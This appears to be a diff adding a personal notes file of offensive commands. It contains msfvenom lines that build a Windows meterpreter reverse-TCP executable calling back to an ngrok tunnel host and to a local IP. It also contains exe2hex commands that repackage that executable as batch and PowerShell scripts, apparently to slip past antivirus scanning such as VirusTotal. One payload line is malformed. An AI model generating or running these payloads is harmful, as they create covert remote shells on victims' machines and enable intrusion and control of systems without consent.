@@ -1,0 +1,26 @@
+virus total
+================
+payload
+=======
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=14976 R > ./payload.exe
+set payload windows/meterpreter/reverse_tcp
+windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 X > payload.exe
+
+
+
+
+
+
+
+
+
+
+
+
+====================================
+exehex
+=====================
+exe2hex -x payload.exe -b payload.bat -p payload.ps1 -cc -v
+exe2hex -x payload.exe -cc
+less /root/payload.bat
